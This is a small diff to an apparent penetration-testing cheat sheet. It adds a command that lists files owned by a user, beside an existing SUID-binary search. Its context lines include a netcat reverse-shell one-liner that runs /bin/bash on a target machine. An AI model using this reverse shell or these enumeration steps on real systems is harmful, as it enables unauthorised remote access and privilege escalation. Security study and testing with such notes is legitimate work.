@@ -10,6 +10,10 @@
 * list binaries with SUID bit set:
 
       find / -perm -u=s -type f 2>/dev/null
+      
+* list files owned by an account:
+
+      find / -user <username> 2>/dev/null
 
 #### Netcat reverse shell
 On the target machine shell : `nc <host> <any port> -e /bin/bash`
